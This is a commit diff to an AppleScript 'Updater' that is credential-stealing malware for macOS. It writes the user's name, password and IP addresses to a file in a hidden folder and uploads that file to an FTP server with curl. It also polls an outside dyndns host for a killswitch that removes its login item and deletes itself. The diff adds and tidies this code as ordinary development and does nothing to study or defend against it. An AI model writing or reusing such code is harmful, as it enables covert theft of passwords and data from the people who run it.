Cleaned up try statements and fixed killswitch

+++ Updater.applescript
@@ -1,22 +1,27 @@
+try
+	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
+	set killswitch to (characters 1 through -1 of result) as text -- Get IP
+	if killswitch = "kill" then -- If killswitch is triggered, delete all of the app and password files
+		tell application "System Events"
+			if login item "login" exists then
+				delete login item "login"
+			end if
+		end tell
+		try
+			do shell script "rm -rf " & (POSIX path of (path to me))
+		end try
+		return
+	end if
+end try
+
 set theuser to do shell script "whoami"
+
 try
 	do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
 end try
 try
 	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
 end try
-
-try
-	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
-	set killswitch to (characters 1 through -1 of result) as text -- Get IP
-	if killswitch = "kill" then
-		-- If killswitch is triggered, delete all of the app and password files
-		do shell script "rm -rf " & ufld & ""
-		do shell script "rm -rf " & (POSIX path of (path to me))
-	end if
-end try
-
-do shell script "open " & (POSIX path of (path to resource "DK.app"))
 
 try
 	repeat
@@ -43,7 +48,10 @@ try
 		set WANIP to "not connected"
 		set LANIP to "not connected"
 	end try
-	do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
+	
+	try
+		do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
+	end try
 	
 	try
 		tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
@@ -60,7 +68,3 @@ try
 	end try
 	
 end try
-
-set app_name to "DK"
-set the_pid to (do shell script "ps ax | grep " & (quoted form of app_name) & " | grep -v grep | awk '{print $1}'")
-if the_pid is not "" then do shell script ("kill -9 " & the_pid)
